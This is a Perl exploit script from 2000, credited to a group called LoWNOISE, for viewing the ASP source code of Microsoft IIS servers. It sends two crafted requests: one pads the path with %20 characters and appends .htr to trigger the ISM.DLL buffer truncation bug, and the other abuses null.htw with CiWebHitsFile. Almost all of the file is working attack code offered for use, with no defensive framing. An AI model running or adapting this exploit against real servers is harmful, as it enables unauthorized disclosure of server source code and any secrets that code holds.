#!/usr/bin/perl
#----------------------------------------------------------------#
# [ISMyASP]                                                      #
# IIS ASP source code viewer using ISM.DLL buffer truncation bug #
# and null.htw bug                                               # 
# LoWNOISE Colombia 5/2000                                       #
# Efrain 'ET' Torres et@cyberspace.org                           #
#----------------------------------------------------------------#
# Shoutz 2 f4lc0n & M43ztr0 <-- a gnu memb.                      #
#----------------------------------------------------------------#
# Some f() from wwwboard.pl by S.Sparling                        #
#----------------------------------------------------------------#

use Socket;  

$port=80; 

if (!($ARGV[0])) {
  print "\n[ISMyASP]\n";               
  print "$0 http://host/view.asp \n";
  print "ET LoWNOISE Colombia.\n";
  exit;
}

$url=$ARGV[0]; 

chop($url) if $url =~ /\n$/;
print "url: $url\n";

$remote = $url;
$remote =~ s/http\:\/\///g;
$remote =~ s/\/([^>]|\n)*//g;
print "host: $remote\n";

$path = $url;
$path =~ s/http\:\/\///g;
$path =~ s/$remote//g;
print "path: $path\n";


$spaces=230; #THIS IS THE DEFAULT VALUE FOR ISM.DLL b.t
             #REMEMBER THIS ATTACK ONLY WORKS ONLY 1 TIME
             #READ THE CERBERUS CISADV000327.

$submit = "GET $path";

$i=0;
while($i < $spaces)
{
   $submit= "$submit%20";
   $i++;
  
}
$submit= "$submit.htr HTTP/1.0\n\n";

print "======Trying ism.dll buffer truncation...\n";
print "submit: $submit\n\n";

&post_message;

print "======Trying null.htw...\n";
$submit="GET /null.htw?CiWebHitsFile=$path%20&CiRestriction=none&CiHiliteType=Full HTTP/1.0\n\n";
print "submit: $submit\n\n";

&post_message;

sub post_message
{
   if ($port =~ /\D/) { $port = getservbyname($port, 'tcp'); }
   die("No port specified.") unless $port;
   $iaddr = inet_aton($remote) || die("Failed to find host: $remote");
   $paddr = sockaddr_in($port, $iaddr);
   $proto = getprotobyname('tcp');
   socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die("Failed to open socket: $!");
   connect(SOCK, $paddr) || die("Unable to connect: $!");
   send(SOCK,$submit,0);
   printf "\n======Waiting for reply [pray]....\n\n";
   while(<SOCK>) {
      print $_;
   }
   close(SOCK);
}

print "\n\n======THE END.   [LoWNOISE]\n";
exit;
#:) narco.guerrilla&gov.sucks.co       (huge :x to PO-K)     
